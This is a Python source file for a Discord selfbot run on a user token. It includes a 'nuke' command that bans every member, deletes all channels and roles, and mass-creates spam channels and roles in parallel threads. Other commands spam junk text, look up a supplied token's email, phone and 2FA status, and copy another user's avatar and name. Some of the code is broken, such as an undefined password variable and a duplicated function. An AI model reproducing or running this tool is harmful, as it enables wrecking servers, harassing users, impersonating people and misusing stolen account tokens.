# -*- coding: utf-8 -*-

import os
import colorama
import discord
import humanize
import jstyleson
import time
import random
import threading
from pyfiglet import Figlet

from string import ascii_letters as letters
import requests
from discord.ext import commands

try:
    os.system("title Selfbot")
except:
    pass

if not os.path.exists("./config.jsonc"):
    with open("./config.jsonc", "w") as f:
        f.write("""{
            "token": "",
            "prefix": "s.",
            "selfbot": true,
            "delete_cmd": false,
            "delete_cmd_output_after": null,
            "spam_chars": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
            "autoupdate": false,
            "write_mentions": false
        }""")

with open("config.jsonc", "r") as f:
    config = jstyleson.loads(f.read())

# Constants
DISCORD_LIMIT = 2000
MAIN_CLR =  colorama.Fore.LIGHTMAGENTA_EX
RESET = colorama.Style.RESET_ALL
CLS = lambda: os.system("cls") if os.name == "nt" else "clear"
headers = {'Authorization': f'{config["token"]}'}

def get_mention(id):
    return f"<@!{id}>"

def replace_mention(string, id, name):
    return string.replace(get_mention(id), f"@{name}")

# Format UTC time with humanize
def format_time(time):
    return humanize.naturaltime(time)

def center(string, width):
    return string.center(width)

def BanMembers(guild, member):
    while True:
        r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{MAIN_CLR}[{format_time(time.time())}] {member} has been banned from {guild}")
                break
            else:
                break

def DeleteChannels(guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{MAIN_CLR}[{format_time(time.time())}] {channel} has been deleted from {guild}")
                    break
                else:
                    break

def DeleteRoles(guild, role):
    while True:
        r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{MAIN_CLR}[{format_time(time.time())}] {role} has been deleted from {guild}")
                break
            else:
                break

def SpamChannels(guild, name):
    while True:
        json = {'name': name, 'type': 0}
        r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{MAIN_CLR}[{format_time(time.time())}] {name} has been created in {guild}")
                break
            else:
                break

def SpamRoles(guild, name):
    while True:
        json = {'name': name}
        r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{MAIN_CLR}[{format_time(time.time())}] {name} has been created in {guild}")
                break
            else:
                break

async def NukeExecute(guild, channel_name, channel_amount, role_name, role_amount):
    # From AveryNuker
    for member in guild.members:
        threading.Thread(target=BanMembers, args=(str(guild.id), str(member.id),)).start()
    for channel in guild.channels:
        threading.Thread(target=DeleteChannels, args=(str(guild.id), str(channel.id),)).start()
    for role in guild.roles:
        threading.Thread(target=DeleteRoles, args=(str(guild.id), str(role.id),)).start()
    for i in range(int(channel_amount)):
        threading.Thread(target=SpamChannels, args=(str(guild.id), str(channel_name),)).start()
    for i in range(int(role_amount)):
        threading.Thread(target=SpamRoles, args=(str(guild.id), str(role_name),)).start()

def ascii_art(string):
    return Figlet(font='slant').renderText(string)

def get_token_info(token):
    headers = {"Authorization": token}
    r = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
    return r.json()

if not os.path.exists("mentions.txt"):
    with open("mentions.txt", "w") as f:
        f.write("")

__TOKEN__ = config["token"]
__PREFIX__ = config["prefix"]
__SELFBOT__ = config["selfbot"]
__DELETE_CMD__ = config["delete_cmd"] # Deletes the command: for example, if you want to delete the command "?ping"
__DELETE_CMD_OUTPUT_AFTER__ = config["delete_cmd_output_after"] # None = doesnt delete the output
__SPAM_CHARS__ = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
__AUTOUPDATE__ = config["autoupdate"]
# __PASSWORD__ = config["password"]

WRITE_MENTIONS = config["write_mentions"] # If True, all mentions will be saved to mentions.txt

# Colors
colorama.init()
red = colorama.Fore.RED
green = colorama.Fore.GREEN
yellow = colorama.Fore.YELLOW
blue = colorama.Fore.BLUE
magenta = colorama.Fore.MAGENTA
cyan = colorama.Fore.CYAN
white = colorama.Fore.WHITE

bot = commands.Bot(command_prefix=__PREFIX__, self_bot=True, case_insensitive=True, help_command=None)

# On Online

@bot.event
async def on_ready():
    CLS()
    print(f"{MAIN_CLR}Username {RESET} >>> {str(bot.user)}")
    print(f"{MAIN_CLR}Friends  {RESET} >>> {str(len(bot.user.friends))}")
    print(f"{MAIN_CLR}Blocked  {RESET} >>> {str(len(bot.user.blocked))}")
    print(f"{MAIN_CLR}Servers  {RESET} >>> {str(len(bot.guilds))}")
    print(f"{MAIN_CLR}Prefix   {RESET} >>> {str(__PREFIX__)}")

@bot.event
async def on_message(message):
    if f"<@!{bot.user.id}>" in message.content and not message.author.id == bot.user.id:
        print(f"{blue}[PING]{RESET} ~ " + f"{str(message.author)} >>> {replace_mention(message.content, bot.user.id, bot.user.name)}")
        with open("mentions.txt", "a") as f:
            f.write(f"\n{str(message.author)} >>> {replace_mention(message.content, bot.user.id, bot.user.name)}")

    if not message.author.id == bot.user.id: return
    await bot.process_commands(message)

@bot.event
async def on_command(ctx):
    print(f"{green}[COMMAND]{RESET} ~ " + f"{str(ctx.author)} >>> {replace_mention(ctx.message.content, bot.user.id, bot.user.name)}")
    if __DELETE_CMD__: await ctx.message.delete()

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(f"{red}Command not found > {ctx.message.content}{RESET}")
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{red}Missing argument > {error}{RESET}")
    elif isinstance(error, commands.MissingPermissions):
        print(f"{red}Missing permissions > {error}{RESET}")
    elif isinstance(error, commands.CommandOnCooldown):
        print(f"{red}Cooldown > {error}{RESET}")
    elif isinstance(error, commands.CheckFailure): 
        print(f"{red}Check failure > {error}{RESET}")
    elif isinstance(error, commands.CommandInvokeError):
        print(f"{red}Command invoke error > {error}{RESET}")
    elif isinstance(error, commands.CommandError):
        print(f"{red}Command error{RESET}")
    elif isinstance(error, commands.BadArgument):
        print(f"{red}Bad argument > {error}{RESET}")
    elif isinstance(error, commands.BotMissingPermissions):
        print(f"{red}Bot missing permissions > {error}{RESET}")
    elif isinstance(error, commands.MissingPermissions):
        print(f"{red}Missing permissions > {error}{RESET}")
    elif isinstance(error, commands.NoPrivateMessage):
        print(f"{red}No private message > {error}{RESET}")
    else:
        print(f"{red}Unknown error in {str(ctx.message.channel)}: {error}{RESET}")
            
# Commands

# Ping command: check ping
@bot.command("ping", help="Tells you bot latency")
async def _ping(ctx):
    await ctx.send(f"`{round(bot.latency * 1000)}ms`", delete_after=__DELETE_CMD_OUTPUT_AFTER__)

# Help command: show help
@bot.command("help", help="Shows this command", alias=["?", "h"])
async def _help(ctx):
    # get longest item in bot.commands
    longest = max(len(x.name) for x in bot.commands)
    res = ["```ini"]
    for c in bot.commands:
        if c.hidden: continue
        res.append(f"[{center(__PREFIX__+c.name, longest+4)}] - {c.help}\n")
    res.append("```")
    await ctx.send("\n".join(res), delete_after=__DELETE_CMD_OUTPUT_AFTER__)

# Userinfo command: show user info
@bot.command("userinfo", help="Shows user info", alias=["ui"])
async def _userinfo(ctx, user: discord.User=None):
    if not user: user = ctx.author
    info = [
        "Username",
        "ID",
        "Created at",
        "Avatar URL",
        "Discriminator",
        "Bot?"
    ]
    padding = 20
    res = ["```ini"]
    txt = ""

    for i in info:
        txt += " " * int((padding - len(i)) / 2) + i
        add = padding - len(txt)
        txt += " " * add
        if i == "Username": res.append(f"[{txt}] {str(user.name)}")
        elif i == "ID": res.append(f"[{txt}] {str(user.id)}")
        elif i == "Created at": res.append(f"[{txt}] {str(format_time((user.created_at)))}")
        # elif i == "Avatar URL": res.append(f"[{txt}] {str(user.avatar_url)}")
        elif i == "Discriminator": res.append(f"[{txt}] {str(user.discriminator)}")
        elif i == "Bot?": res.append(f"[{txt}] {str(user.bot)}")
        txt = ""
    res.append("```")
    await ctx.send("\n".join(res), delete_after=__DELETE_CMD_OUTPUT_AFTER__)

@bot.command("nuke", help="Nukes a Server")
async def _nuke(ctx, channel_name = "NUKE", channel_amount = 5, role_name = "NUKE", role_amount = 5):
    await NukeExecute(ctx.guild, channel_name, channel_amount, role_name, role_amount)

@bot.command("spam", help="Spams random text")
async def _spam(ctx, times: int):
    for i in range(times):
        rand_text = random.choices(__SPAM_CHARS__, k=random.randint(1, len(__SPAM_CHARS__)))
        await ctx.send(''.join(rand_text))

@bot.command("junk", help="Junk Spam")
async def _junk(ctx):
    for _ in range(0, 11):
        d = "᲼\n"*500
        await ctx.send(f"{d}")

@bot.command("close", help="Closes the bot")
async def _close(ctx):
    await bot.close()
    exit(0)

@bot.command("stealpfp", help="Steals a user's profile picture and sets it as your own", aliases=["spfp"])
async def _stealpfp(ctx, user: discord.User):
    await bot.user.edit(avatar=user.avatar_url, password=__PASSWORD__)

@bot.command("stealname", help="Steals a user's name and sets it as your own", aliases=["sn", "sname"])
async def _stealname(ctx, user: discord.User):
    await bot.user.edit(username=user.name, password=__PASSWORD__)

@bot.command("ban", help="Bans a user", aliases=["b"])
async def _ban(ctx, user: discord.user, *, reason: str=None):
    await ctx.guild.ban(user, reason=reason)

@bot.command("kick", help="kicks a user", aliases=[""])
async def _ban(ctx, user: discord.user, *,reason=None):
    await ctx.guild.kick(user, reason=reason)

@bot.command("ascii", help="Converts text to ascii art", aliases=["a"])
async def _ascii(ctx, *, text: str):
    await ctx.send(f"```\n{ascii_art(text)}\n```")

@bot.command("tokeninfo", help="Shows token info", aliases=["ti"])
async def _tokeninfo(ctx, token):
    info = [
        "Username",
        "ID",
        "2FA Enabled",
        "Phone Number",
        "Email",
        "Token"
    ]
    uinfo = get_token_info(token)
    padding = 17
    res = ["```ini"]
    for i in info:
        if i == "Username": res.append(f"[{center(i, padding)}] {str(uinfo['username'])}")
        elif i == "ID": res.append(f"[{center(i, padding)}] {str(uinfo['id'])}")
        elif i == "2FA Enabled": res.append(f"[{center(i, padding)}] {str(uinfo['mfa_enabled'])}")
        elif i == "Phone Number": res.append(f"[{center(i, padding)}] {str(uinfo['phone'])}")
        elif i == "Email": res.append(f"[{center(i, padding)}] {str(uinfo['email'])}")
        elif i == "Token": res.append(f"[{center(i, padding)}] {token}")
    res.append("```")
    await ctx.send("\n".join(res), delete_after=__DELETE_CMD_OUTPUT_AFTER__)

@bot.command("serverinfo", help="Shows server info", aliases=["si"])
async def _serverinfo(ctx):
    info = [
        "Name",
        "ID",
        "Owner",
        "Owner ID",
        "Region",
        "Verification Level",
        "Member Count",
        "Created at"
    ]
    longest = max(len(i) for i in info)
    padding = longest + 2
    res = ["```ini"]
    guild = ctx.message.guild
    for i in info:
        if i == "Name": res.append(f"[{center(i, padding)}] {str(guild.name)}")
        elif i == "ID": res.append(f"[{center(i, padding)}] {str(guild.id)}")
        elif i == "Owner": res.append(f"[{center(i, padding)}] {str(guild.owner)}")
        elif i == "Owner ID": res.append(f"[{center(i, padding)}] {str(guild.owner.id)}")
        elif i == "Region": res.append(f"[{center(i, padding)}] {str(guild.region)}")
        elif i == "Verification Level": res.append(f"[{center(i, padding)}] {str(guild.verification_level)}")
        elif i == "Member Count": res.append(f"[{center(i, padding)}] {str(guild.member_count)}")
        elif i == "Created at": res.append(f"[{center(i, padding)}] {str(format_time((guild.created_at)))}")
    res.append("```")
    await ctx.send("\n".join(res), delete_after=__DELETE_CMD_OUTPUT_AFTER__)

# @bot.command("ateveryone", help="@s everyone", aliases=["@"])
# async def _ateveryone(ctx):
#     txt = ""
#     guild = bot.fetch_guild(guild_id=ctx.guild.id)
#     for member in guild.members:
#         txt += f"@{member.name} "
#     await ctx.send(txt)

if __name__ == "__main__":
    if __TOKEN__ == "":
        print(f"{red}[ERROR]{RESET} ~ No token found. Please add your token to the config.jsonc file.")
        __TOKEN__ = input("Token: ")
        with open(file="config.jsonc", mode="w") as f:
            prmpt = """
            {
                "token": "666",
                "prefix": "s.",
                "delete_cmd": true,
                "delete_cmd_output_after": null,
                "spam_chars": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                "autoupdate": false,
                "write_mentions": false,
                "password": "" // Only if you want to use steal pfp or steal username
            }
            """.replace("666", __TOKEN__)
            f.write(prmpt)
    bot.run(
        __TOKEN__,
        bot=False
    )
